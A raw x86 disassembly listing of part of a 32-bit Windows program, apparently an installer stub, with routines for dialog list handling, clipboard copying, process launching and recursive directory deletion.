  40575b:	0f 85 89 01 00 00    	jne    0x4058ea
  405761:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  405765:	83 4d dc ff          	orl    $0xffffffff,-0x24(%ebp)
  405769:	6a 02                	push   $0x2
  40576b:	33 c0                	xor    %eax,%eax
  40576d:	5e                   	pop    %esi
  40576e:	8d 7d e0             	lea    -0x20(%ebp),%edi
  405771:	89 75 c8             	mov    %esi,-0x38(%ebp)
  405774:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  405777:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  40577a:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  40577d:	ab                   	stos   %eax,%es:(%edi)
  40577e:	ab                   	stos   %eax,%es:(%edi)
  40577f:	a1 30 9a 42 00       	mov    0x429a30,%eax
  405784:	8b 3d 3c 82 40 00    	mov    0x40823c,%edi
  40578a:	68 03 04 00 00       	push   $0x403
  40578f:	8b 48 5c             	mov    0x5c(%eax),%ecx
  405792:	8b 40 60             	mov    0x60(%eax),%eax
  405795:	ff 75 08             	push   0x8(%ebp)
  405798:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40579b:	89 45 10             	mov    %eax,0x10(%ebp)
  40579e:	ff d7                	call   *%edi
  4057a0:	68 ee 03 00 00       	push   $0x3ee
  4057a5:	a3 f0 89 42 00       	mov    %eax,0x4289f0
  4057aa:	ff 75 08             	push   0x8(%ebp)
  4057ad:	ff d7                	call   *%edi
  4057af:	68 f8 03 00 00       	push   $0x3f8
  4057b4:	a3 e8 89 42 00       	mov    %eax,0x4289e8
  4057b9:	ff 75 08             	push   0x8(%ebp)
  4057bc:	ff d7                	call   *%edi
  4057be:	ff 35 f0 89 42 00    	push   0x4289f0
  4057c4:	a3 04 8a 42 00       	mov    %eax,0x428a04
  4057c9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4057cc:	e8 5f ed ff ff       	call   0x404530
  4057d1:	6a 04                	push   $0x4
  4057d3:	e8 b1 f6 ff ff       	call   0x404e89
  4057d8:	a3 f4 89 42 00       	mov    %eax,0x4289f4
  4057dd:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4057e0:	50                   	push   %eax
  4057e1:	89 1d 0c 8a 42 00    	mov    %ebx,0x428a0c
  4057e7:	ff 75 fc             	push   -0x4(%ebp)
  4057ea:	ff 15 64 82 40 00    	call   *0x408264
  4057f0:	56                   	push   %esi
  4057f1:	ff 15 88 82 40 00    	call   *0x408288
  4057f7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4057fa:	8b 35 58 82 40 00    	mov    0x408258,%esi
  405800:	2b c8                	sub    %eax,%ecx
  405802:	8d 45 c8             	lea    -0x38(%ebp),%eax
  405805:	50                   	push   %eax
  405806:	53                   	push   %ebx
  405807:	68 61 10 00 00       	push   $0x1061
  40580c:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  40580f:	ff 75 fc             	push   -0x4(%ebp)
  405812:	ff d6                	call   *%esi
  405814:	b8 00 40 00 00       	mov    $0x4000,%eax
  405819:	50                   	push   %eax
  40581a:	50                   	push   %eax
  40581b:	68 36 10 00 00       	push   $0x1036
  405820:	ff 75 fc             	push   -0x4(%ebp)
  405823:	ff d6                	call   *%esi
  405825:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  405828:	7c 1c                	jl     0x405846
  40582a:	ff 75 0c             	push   0xc(%ebp)
  40582d:	53                   	push   %ebx
  40582e:	68 01 10 00 00       	push   $0x1001
  405833:	ff 75 fc             	push   -0x4(%ebp)
  405836:	ff d6                	call   *%esi
  405838:	ff 75 0c             	push   0xc(%ebp)
  40583b:	53                   	push   %ebx
  40583c:	68 26 10 00 00       	push   $0x1026
  405841:	ff 75 fc             	push   -0x4(%ebp)
  405844:	ff d6                	call   *%esi
  405846:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  405849:	7c 0e                	jl     0x405859
  40584b:	ff 75 10             	push   0x10(%ebp)
  40584e:	53                   	push   %ebx
  40584f:	68 24 10 00 00       	push   $0x1024
  405854:	ff 75 fc             	push   -0x4(%ebp)
  405857:	ff d6                	call   *%esi
  405859:	8b 45 14             	mov    0x14(%ebp),%eax
  40585c:	ff 70 30             	push   0x30(%eax)
  40585f:	6a 1b                	push   $0x1b
  405861:	ff 75 08             	push   0x8(%ebp)
  405864:	e8 92 ec ff ff       	call   0x4044fb
  405869:	f6 05 38 9a 42 00 03 	testb  $0x3,0x429a38
  405870:	74 34                	je     0x4058a6
  405872:	53                   	push   %ebx
  405873:	ff 35 f0 89 42 00    	push   0x4289f0
  405879:	ff 15 28 82 40 00    	call   *0x408228
  40587f:	f6 05 38 9a 42 00 02 	testb  $0x2,0x429a38
  405886:	75 0d                	jne    0x405895
  405888:	6a 08                	push   $0x8
  40588a:	ff 75 fc             	push   -0x4(%ebp)
  40588d:	ff 15 28 82 40 00    	call   *0x408228
  405893:	eb 06                	jmp    0x40589b
  405895:	89 1d f0 89 42 00    	mov    %ebx,0x4289f0
  40589b:	ff 35 e8 89 42 00    	push   0x4289e8
  4058a1:	e8 8a ec ff ff       	call   0x404530
  4058a6:	68 ec 03 00 00       	push   $0x3ec
  4058ab:	ff 75 08             	push   0x8(%ebp)
  4058ae:	ff d7                	call   *%edi
  4058b0:	68 00 00 30 75       	push   $0x75300000
  4058b5:	8b f8                	mov    %eax,%edi
  4058b7:	53                   	push   %ebx
  4058b8:	68 01 04 00 00       	push   $0x401
  4058bd:	57                   	push   %edi
  4058be:	ff d6                	call   *%esi
  4058c0:	f6 05 38 9a 42 00 04 	testb  $0x4,0x429a38
  4058c7:	0f 84 fc 01 00 00    	je     0x405ac9
  4058cd:	ff 75 10             	push   0x10(%ebp)
  4058d0:	53                   	push   %ebx
  4058d1:	68 09 04 00 00       	push   $0x409
  4058d6:	57                   	push   %edi
  4058d7:	ff d6                	call   *%esi
  4058d9:	ff 75 0c             	push   0xc(%ebp)
  4058dc:	53                   	push   %ebx
  4058dd:	68 01 20 00 00       	push   $0x2001
  4058e2:	57                   	push   %edi
  4058e3:	ff d6                	call   *%esi
  4058e5:	e9 df 01 00 00       	jmp    0x405ac9
  4058ea:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4058f1:	75 28                	jne    0x40591b
  4058f3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4058f6:	50                   	push   %eax
  4058f7:	53                   	push   %ebx
  4058f8:	68 ec 03 00 00       	push   $0x3ec
  4058fd:	ff 75 08             	push   0x8(%ebp)
  405900:	ff 15 3c 82 40 00    	call   *0x40823c
  405906:	50                   	push   %eax
  405907:	68 d4 56 40 00       	push   $0x4056d4
  40590c:	53                   	push   %ebx
  40590d:	53                   	push   %ebx
  40590e:	ff 15 84 80 40 00    	call   *0x408084
  405914:	50                   	push   %eax
  405915:	ff 15 fc 80 40 00    	call   *0x4080fc
  40591b:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405922:	8b 3d 28 82 40 00    	mov    0x408228,%edi
  405928:	75 1c                	jne    0x405946
  40592a:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  405930:	75 39                	jne    0x40596b
  405932:	53                   	push   %ebx
  405933:	ff 35 f0 89 42 00    	push   0x4289f0
  405939:	ff d7                	call   *%edi
  40593b:	6a 08                	push   $0x8
  40593d:	56                   	push   %esi
  40593e:	ff d7                	call   *%edi
  405940:	56                   	push   %esi
  405941:	e8 ea eb ff ff       	call   0x404530
  405946:	33 f6                	xor    %esi,%esi
  405948:	46                   	inc    %esi
  405949:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  405950:	75 54                	jne    0x4059a6
  405952:	39 1d ec 89 42 00    	cmp    %ebx,0x4289ec
  405958:	74 26                	je     0x405980
  40595a:	6a 78                	push   $0x78
  40595c:	c7 05 d8 16 42 00 02 	movl   $0x2,0x4216d8
  405963:	00 00 00 
  405966:	e8 69 eb ff ff       	call   0x4044d4
  40596b:	ff 75 14             	push   0x14(%ebp)
  40596e:	ff 75 10             	push   0x10(%ebp)
  405971:	ff 75 0c             	push   0xc(%ebp)
  405974:	e8 e9 eb ff ff       	call   0x404562
  405979:	5f                   	pop    %edi
  40597a:	5e                   	pop    %esi
  40597b:	5b                   	pop    %ebx
  40597c:	c9                   	leave
  40597d:	c2 10 00             	ret    $0x10
  405980:	6a 08                	push   $0x8
  405982:	ff 35 28 9a 42 00    	push   0x429a28
  405988:	ff d7                	call   *%edi
  40598a:	39 1d ac 9a 42 00    	cmp    %ebx,0x429aac
  405990:	75 0e                	jne    0x4059a0
  405992:	a1 e0 1e 42 00       	mov    0x421ee0,%eax
  405997:	53                   	push   %ebx
  405998:	ff 70 34             	push   0x34(%eax)
  40599b:	e8 61 fc ff ff       	call   0x405601
  4059a0:	56                   	push   %esi
  4059a1:	e8 2e eb ff ff       	call   0x4044d4
  4059a6:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  4059aa:	75 bf                	jne    0x40596b
  4059ac:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4059af:	39 45 10             	cmp    %eax,0x10(%ebp)
  4059b2:	75 b7                	jne    0x40596b
  4059b4:	53                   	push   %ebx
  4059b5:	53                   	push   %ebx
  4059b6:	68 04 10 00 00       	push   $0x1004
  4059bb:	50                   	push   %eax
  4059bc:	ff 15 58 82 40 00    	call   *0x408258
  4059c2:	3b c3                	cmp    %ebx,%eax
  4059c4:	89 45 0c             	mov    %eax,0xc(%ebp)
  4059c7:	0f 8e fc 00 00 00    	jle    0x405ac9
  4059cd:	ff 15 98 81 40 00    	call   *0x408198
  4059d3:	6a e1                	push   $0xffffffe1
  4059d5:	53                   	push   %ebx
  4059d6:	8b f8                	mov    %eax,%edi
  4059d8:	e8 dc 0b 00 00       	call   0x4065b9
  4059dd:	50                   	push   %eax
  4059de:	56                   	push   %esi
  4059df:	53                   	push   %ebx
  4059e0:	57                   	push   %edi
  4059e1:	ff 15 9c 81 40 00    	call   *0x40819c
  4059e7:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4059ea:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  4059ee:	c1 e9 10             	shr    $0x10,%ecx
  4059f1:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  4059f5:	0f bf c9             	movswl %cx,%ecx
  4059f8:	75 13                	jne    0x405a0d
  4059fa:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4059fd:	50                   	push   %eax
  4059fe:	ff 75 fc             	push   -0x4(%ebp)
  405a01:	ff 15 e8 81 40 00    	call   *0x4081e8
  405a07:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405a0a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405a0d:	53                   	push   %ebx
  405a0e:	ff 75 08             	push   0x8(%ebp)
  405a11:	53                   	push   %ebx
  405a12:	51                   	push   %ecx
  405a13:	50                   	push   %eax
  405a14:	68 80 01 00 00       	push   $0x180
  405a19:	57                   	push   %edi
  405a1a:	ff 15 a0 81 40 00    	call   *0x4081a0
  405a20:	3b c6                	cmp    %esi,%eax
  405a22:	0f 85 a1 00 00 00    	jne    0x405ac9
  405a28:	8b 45 0c             	mov    0xc(%ebp),%eax
  405a2b:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  405a2e:	c7 45 d4 08 2f 42 00 	movl   $0x422f08,-0x2c(%ebp)
  405a35:	c7 45 d8 00 10 00 00 	movl   $0x1000,-0x28(%ebp)
  405a3c:	89 45 08             	mov    %eax,0x8(%ebp)
  405a3f:	bf 73 10 00 00       	mov    $0x1073,%edi
  405a44:	ff 4d 08             	decl   0x8(%ebp)
  405a47:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405a4a:	50                   	push   %eax
  405a4b:	ff 75 08             	push   0x8(%ebp)
  405a4e:	57                   	push   %edi
  405a4f:	ff 75 fc             	push   -0x4(%ebp)
  405a52:	ff 15 58 82 40 00    	call   *0x408258
  405a58:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405a5b:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  405a5f:	75 e3                	jne    0x405a44
  405a61:	53                   	push   %ebx
  405a62:	ff 15 a4 81 40 00    	call   *0x4081a4
  405a68:	ff 15 a8 81 40 00    	call   *0x4081a8
  405a6e:	8d 04 36             	lea    (%esi,%esi,1),%eax
  405a71:	50                   	push   %eax
  405a72:	6a 42                	push   $0x42
  405a74:	ff 15 10 81 40 00    	call   *0x408110
  405a7a:	50                   	push   %eax
  405a7b:	89 45 08             	mov    %eax,0x8(%ebp)
  405a7e:	ff 15 88 80 40 00    	call   *0x408088
  405a84:	8b f0                	mov    %eax,%esi
  405a86:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405a89:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  405a8c:	50                   	push   %eax
  405a8d:	53                   	push   %ebx
  405a8e:	57                   	push   %edi
  405a8f:	ff 75 fc             	push   -0x4(%ebp)
  405a92:	ff 15 58 82 40 00    	call   *0x408258
  405a98:	8d 34 46             	lea    (%esi,%eax,2),%esi
  405a9b:	66 c7 06 0d 00       	movw   $0xd,(%esi)
  405aa0:	46                   	inc    %esi
  405aa1:	46                   	inc    %esi
  405aa2:	66 c7 06 0a 00       	movw   $0xa,(%esi)
  405aa7:	46                   	inc    %esi
  405aa8:	46                   	inc    %esi
  405aa9:	43                   	inc    %ebx
  405aaa:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  405aad:	7c d7                	jl     0x405a86
  405aaf:	ff 75 08             	push   0x8(%ebp)
  405ab2:	ff 15 8c 80 40 00    	call   *0x40808c
  405ab8:	ff 75 08             	push   0x8(%ebp)
  405abb:	6a 0d                	push   $0xd
  405abd:	ff 15 ac 81 40 00    	call   *0x4081ac
  405ac3:	ff 15 b0 81 40 00    	call   *0x4081b0
  405ac9:	33 c0                	xor    %eax,%eax
  405acb:	e9 a9 fe ff ff       	jmp    0x405979
  405ad0:	55                   	push   %ebp
  405ad1:	8b ec                	mov    %esp,%ebp
  405ad3:	83 ec 20             	sub    $0x20,%esp
  405ad6:	b8 f0 83 40 00       	mov    $0x4083f0,%eax
  405adb:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405adf:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405ae2:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405ae5:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405ae8:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405aec:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405af0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405af3:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405af6:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405afa:	50                   	push   %eax
  405afb:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405b01:	ff 75 08             	push   0x8(%ebp)
  405b04:	c7 45 f0 e0 83 40 00 	movl   $0x4083e0,-0x10(%ebp)
  405b0b:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405b12:	ff 15 80 80 40 00    	call   *0x408080
  405b18:	85 c0                	test   %eax,%eax
  405b1a:	74 04                	je     0x405b20
  405b1c:	33 c0                	xor    %eax,%eax
  405b1e:	eb 06                	jmp    0x405b26
  405b20:	ff 15 c8 80 40 00    	call   *0x4080c8
  405b26:	c9                   	leave
  405b27:	c2 04 00             	ret    $0x4
  405b2a:	6a 00                	push   $0x0
  405b2c:	ff 74 24 08          	push   0x8(%esp)
  405b30:	ff 15 80 80 40 00    	call   *0x408080
  405b36:	85 c0                	test   %eax,%eax
  405b38:	74 04                	je     0x405b3e
  405b3a:	33 c0                	xor    %eax,%eax
  405b3c:	eb 06                	jmp    0x405b44
  405b3e:	ff 15 c8 80 40 00    	call   *0x4080c8
  405b44:	c2 04 00             	ret    $0x4
  405b47:	6a 06                	push   $0x6
  405b49:	e8 22 0e 00 00       	call   0x406970
  405b4e:	85 c0                	test   %eax,%eax
  405b50:	74 0a                	je     0x405b5c
  405b52:	ff d0                	call   *%eax
  405b54:	85 c0                	test   %eax,%eax
  405b56:	74 04                	je     0x405b5c
  405b58:	33 c0                	xor    %eax,%eax
  405b5a:	40                   	inc    %eax
  405b5b:	c3                   	ret
  405b5c:	33 c0                	xor    %eax,%eax
  405b5e:	c3                   	ret
  405b5f:	55                   	push   %ebp
  405b60:	8b ec                	mov    %esp,%ebp
  405b62:	83 ec 10             	sub    $0x10,%esp
  405b65:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405b68:	c7 05 10 5f 42 00 44 	movl   $0x44,0x425f10
  405b6f:	00 00 00 
  405b72:	50                   	push   %eax
  405b73:	33 c0                	xor    %eax,%eax
  405b75:	68 10 5f 42 00       	push   $0x425f10
  405b7a:	50                   	push   %eax
  405b7b:	50                   	push   %eax
  405b7c:	68 00 00 00 04       	push   $0x4000000
  405b81:	50                   	push   %eax
  405b82:	50                   	push   %eax
  405b83:	50                   	push   %eax
  405b84:	ff 75 08             	push   0x8(%ebp)
  405b87:	50                   	push   %eax
  405b88:	ff 15 7c 80 40 00    	call   *0x40807c
  405b8e:	85 c0                	test   %eax,%eax
  405b90:	74 0c                	je     0x405b9e
  405b92:	ff 75 f4             	push   -0xc(%ebp)
  405b95:	ff 15 fc 80 40 00    	call   *0x4080fc
  405b9b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405b9e:	c9                   	leave
  405b9f:	c2 04 00             	ret    $0x4
  405ba2:	8b 44 24 04          	mov    0x4(%esp),%eax
  405ba6:	50                   	push   %eax
  405ba7:	83 60 24 00          	andl   $0x0,0x24(%eax)
  405bab:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  405bb1:	ff 15 84 81 40 00    	call   *0x408184
  405bb7:	c2 04 00             	ret    $0x4
  405bba:	ff 25 94 81 40 00    	jmp    *0x408194
  405bc0:	68 00 04 00 00       	push   $0x400
  405bc5:	ff 74 24 0c          	push   0xc(%esp)
  405bc9:	ff 74 24 0c          	push   0xc(%esp)
  405bcd:	ff 35 f8 89 42 00    	push   0x4289f8
  405bd3:	ff 15 90 81 40 00    	call   *0x408190
  405bd9:	c2 08 00             	ret    $0x8
  405bdc:	8b 44 24 08          	mov    0x8(%esp),%eax
  405be0:	8b c8                	mov    %eax,%ecx
  405be2:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405be8:	83 3d c0 9a 42 00 00 	cmpl   $0x0,0x429ac0
  405bef:	74 05                	je     0x405bf6
  405bf1:	c1 e8 15             	shr    $0x15,%eax
  405bf4:	75 47                	jne    0x405c3d
  405bf6:	83 3d c8 9a 42 00 00 	cmpl   $0x0,0x429ac8
  405bfd:	74 06                	je     0x405c05
  405bff:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405c05:	a1 28 9a 42 00       	mov    0x429a28,%eax
  405c0a:	68 b0 a3 40 00       	push   $0x40a3b0
  405c0f:	a3 b4 a3 40 00       	mov    %eax,0x40a3b4
  405c14:	a1 20 9a 42 00       	mov    0x429a20,%eax
  405c19:	a3 b8 a3 40 00       	mov    %eax,0x40a3b8
  405c1e:	8b 44 24 08          	mov    0x8(%esp),%eax
  405c22:	a3 bc a3 40 00       	mov    %eax,0x40a3bc
  405c27:	c7 05 c0 a3 40 00 20 	movl   $0x428a20,0x40a3c0
  405c2e:	8a 42 00 
  405c31:	89 0d c4 a3 40 00    	mov    %ecx,0x40a3c4
  405c37:	ff 15 8c 81 40 00    	call   *0x40818c
  405c3d:	c2 08 00             	ret    $0x8
  405c40:	56                   	push   %esi
  405c41:	8b 74 24 08          	mov    0x8(%esp),%esi
  405c45:	57                   	push   %edi
  405c46:	56                   	push   %esi
  405c47:	e8 fb 03 00 00       	call   0x406047
  405c4c:	8b f8                	mov    %eax,%edi
  405c4e:	83 ff ff             	cmp    $0xffffffff,%edi
  405c51:	74 2e                	je     0x405c81
  405c53:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  405c58:	56                   	push   %esi
  405c59:	74 08                	je     0x405c63
  405c5b:	ff 15 78 80 40 00    	call   *0x408078
  405c61:	eb 06                	jmp    0x405c69
  405c63:	ff 15 44 81 40 00    	call   *0x408144
  405c69:	85 c0                	test   %eax,%eax
  405c6b:	74 05                	je     0x405c72
  405c6d:	33 c0                	xor    %eax,%eax
  405c6f:	40                   	inc    %eax
  405c70:	eb 11                	jmp    0x405c83
  405c72:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  405c77:	75 08                	jne    0x405c81
  405c79:	57                   	push   %edi
  405c7a:	56                   	push   %esi
  405c7b:	ff 15 d8 80 40 00    	call   *0x4080d8
  405c81:	33 c0                	xor    %eax,%eax
  405c83:	5f                   	pop    %edi
  405c84:	5e                   	pop    %esi
  405c85:	c2 08 00             	ret    $0x8
  405c88:	55                   	push   %ebp
  405c89:	8b ec                	mov    %esp,%ebp
  405c8b:	81 ec 58 02 00 00    	sub    $0x258,%esp
  405c91:	53                   	push   %ebx
  405c92:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405c95:	56                   	push   %esi
  405c96:	57                   	push   %edi
  405c97:	8b 7d 08             	mov    0x8(%ebp),%edi
  405c9a:	8b c3                	mov    %ebx,%eax
  405c9c:	83 e0 04             	and    $0x4,%eax
  405c9f:	57                   	push   %edi
  405ca0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405ca3:	e8 ab 02 00 00       	call   0x405f53
  405ca8:	f6 c3 08             	test   $0x8,%bl
  405cab:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405cae:	74 17                	je     0x405cc7
  405cb0:	57                   	push   %edi
  405cb1:	ff 15 44 81 40 00    	call   *0x408144
  405cb7:	f7 d8                	neg    %eax
  405cb9:	1b c0                	sbb    %eax,%eax
  405cbb:	40                   	inc    %eax
  405cbc:	01 05 a8 9a 42 00    	add    %eax,0x429aa8
  405cc2:	e9 7d 01 00 00       	jmp    0x405e44
  405cc7:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405cca:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405cce:	74 11                	je     0x405ce1
  405cd0:	85 c0                	test   %eax,%eax
  405cd2:	0f 84 1a 01 00 00    	je     0x405df2
  405cd8:	f6 c3 02             	test   $0x2,%bl
  405cdb:	0f 84 11 01 00 00    	je     0x405df2
  405ce1:	be 10 4f 42 00       	mov    $0x424f10,%esi
  405ce6:	57                   	push   %edi
  405ce7:	56                   	push   %esi
  405ce8:	e8 8f 08 00 00       	call   0x40657c
  405ced:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405cf1:	74 0d                	je     0x405d00
  405cf3:	68 6c a5 40 00       	push   $0x40a56c
  405cf8:	56                   	push   %esi
  405cf9:	e8 9a 08 00 00       	call   0x406598
  405cfe:	eb 06                	jmp    0x405d06
  405d00:	57                   	push   %edi
  405d01:	e8 91 01 00 00       	call   0x405e97
  405d06:	66 83 3f 00          	cmpw   $0x0,(%edi)
  405d0a:	75 0a                	jne    0x405d16
  405d0c:	66 83 3d 10 4f 42 00 	cmpw   $0x5c,0x424f10
  405d13:	5c 
  405d14:	75 0b                	jne    0x405d21
  405d16:	68 14 a0 40 00       	push   $0x40a014
  405d1b:	57                   	push   %edi
  405d1c:	e8 77 08 00 00       	call   0x406598
  405d21:	57                   	push   %edi
  405d22:	e8 6b 08 00 00       	call   0x406592
  405d27:	8d 1c 47             	lea    (%edi,%eax,2),%ebx
  405d2a:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405d30:	50                   	push   %eax
  405d31:	56                   	push   %esi
  405d32:	ff 15 40 81 40 00    	call   *0x408140
  405d38:	8b f0                	mov    %eax,%esi
  405d3a:	83 fe ff             	cmp    $0xffffffff,%esi
  405d3d:	0f 84 a4 00 00 00    	je     0x405de7
  405d43:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%ebp)
  405d4a:	2e 
  405d4b:	75 1e                	jne    0x405d6b
  405d4d:	66 83 bd d6 fd ff ff 	cmpw   $0x0,-0x22a(%ebp)
  405d54:	00 
  405d55:	74 73                	je     0x405dca
  405d57:	66 83 bd d6 fd ff ff 	cmpw   $0x2e,-0x22a(%ebp)
  405d5e:	2e 
  405d5f:	75 0a                	jne    0x405d6b
  405d61:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%ebp)
  405d68:	00 
  405d69:	74 5f                	je     0x405dca
  405d6b:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  405d71:	50                   	push   %eax
  405d72:	53                   	push   %ebx
  405d73:	e8 04 08 00 00       	call   0x40657c
  405d78:	f6 85 a8 fd ff ff 10 	testb  $0x10,-0x258(%ebp)
  405d7f:	74 15                	je     0x405d96
  405d81:	8b 45 0c             	mov    0xc(%ebp),%eax
  405d84:	83 e0 03             	and    $0x3,%eax
  405d87:	3c 03                	cmp    $0x3,%al
  405d89:	75 3f                	jne    0x405dca
  405d8b:	ff 75 0c             	push   0xc(%ebp)
  405d8e:	57                   	push   %edi
  405d8f:	e8 f4 fe ff ff       	call   0x405c88
  405d94:	eb 34                	jmp    0x405dca
  405d96:	ff 75 fc             	push   -0x4(%ebp)
  405d99:	57                   	push   %edi
  405d9a:	e8 a1 fe ff ff       	call   0x405c40
  405d9f:	85 c0                	test   %eax,%eax
  405da1:	75 1f                	jne    0x405dc2
  405da3:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405da6:	74 12                	je     0x405dba
  405da8:	57                   	push   %edi
  405da9:	6a f1                	push   $0xfffffff1
  405dab:	e8 51 f8 ff ff       	call   0x405601
  405db0:	6a 00                	push   $0x0
  405db2:	57                   	push   %edi
  405db3:	e8 84 05 00 00       	call   0x40633c
  405db8:	eb 10                	jmp    0x405dca
  405dba:	ff 05 a8 9a 42 00    	incl   0x429aa8
  405dc0:	eb 08                	jmp    0x405dca
  405dc2:	57                   	push   %edi
  405dc3:	6a f2                	push   $0xfffffff2
  405dc5:	e8 37 f8 ff ff       	call   0x405601
  405dca:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405dd0:	50                   	push   %eax
  405dd1:	56                   	push   %esi
  405dd2:	ff 15 3c 81 40 00    	call   *0x40813c
  405dd8:	85 c0                	test   %eax,%eax
  405dda:	0f 85 63 ff ff ff    	jne    0x405d43
  405de0:	56                   	push   %esi
  405de1:	ff 15 38 81 40 00    	call   *0x408138
  405de7:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405deb:	74 05                	je     0x405df2
  405ded:	66 83 63 fe 00       	andw   $0x0,-0x2(%ebx)
  405df2:	33 f6                	xor    %esi,%esi
  405df4:	39 75 08             	cmp    %esi,0x8(%ebp)
  405df7:	74 4b                	je     0x405e44
  405df9:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  405dfc:	75 08                	jne    0x405e06
  405dfe:	ff 05 a8 9a 42 00    	incl   0x429aa8
  405e04:	eb 3e                	jmp    0x405e44
  405e06:	57                   	push   %edi
  405e07:	e8 cd 0a 00 00       	call   0x4068d9
  405e0c:	85 c0                	test   %eax,%eax
  405e0e:	74 34                	je     0x405e44
  405e10:	57                   	push   %edi
  405e11:	e8 35 00 00 00       	call   0x405e4b
  405e16:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405e19:	0c 01                	or     $0x1,%al
  405e1b:	50                   	push   %eax
  405e1c:	57                   	push   %edi
  405e1d:	e8 1e fe ff ff       	call   0x405c40
  405e22:	85 c0                	test   %eax,%eax
  405e24:	75 16                	jne    0x405e3c
  405e26:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  405e29:	74 d3                	je     0x405dfe
  405e2b:	57                   	push   %edi
  405e2c:	6a f1                	push   $0xfffffff1
  405e2e:	e8 ce f7 ff ff       	call   0x405601
  405e33:	56                   	push   %esi
  405e34:	57                   	push   %edi
  405e35:	e8 02 05 00 00       	call   0x40633c
  405e3a:	eb 08                	jmp    0x405e44
  405e3c:	57                   	push   %edi
  405e3d:	6a e5                	push   $0xffffffe5
  405e3f:	e8 bd f7 ff ff       	call   0x405601
  405e44:	5f                   	pop    %edi
  405e45:	5e                   	pop    %esi
  405e46:	5b                   	pop    %ebx
  405e47:	c9                   	leave
  405e48:	c2 08 00             	ret    $0x8
  405e4b:	56                   	push   %esi
  405e4c:	8b 74 24 08          	mov    0x8(%esp),%esi
  405e50:	56                   	push   %esi
  405e51:	e8 3c 07 00 00       	call   0x406592
  405e56:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405e59:	50                   	push   %eax
  405e5a:	56                   	push   %esi
  405e5b:	ff 15 fc 81 40 00    	call   *0x4081fc
  405e61:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405e65:	74 0b                	je     0x405e72
  405e67:	68 14 a0 40 00       	push   $0x40a014
  405e6c:	56                   	push   %esi
  405e6d:	e8 26 07 00 00       	call   0x406598
  405e72:	8b c6                	mov    %esi,%eax
  405e74:	5e                   	pop    %esi
  405e75:	c2 04 00             	ret    $0x4
  405e78:	8b 44 24 04          	mov    0x4(%esp),%eax
  405e7c:	eb 0e                	jmp    0x405e8c
  405e7e:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405e83:	74 0f                	je     0x405e94
  405e85:	50                   	push   %eax
  405e86:	ff 15 08 82 40 00    	call   *0x408208
  405e8c:	66 8b 08             	mov    (%eax),%cx
  405e8f:	66 85 c9             	test   %cx,%cx
  405e92:	75 ea                	jne    0x405e7e
  405e94:	c2 08 00             	ret    $0x8
  405e97:	56                   	push   %esi
  405e98:	8b 74 24 08          	mov    0x8(%esp),%esi
  405e9c:	56                   	push   %esi
  405e9d:	e8 f0 06 00 00       	call   0x406592
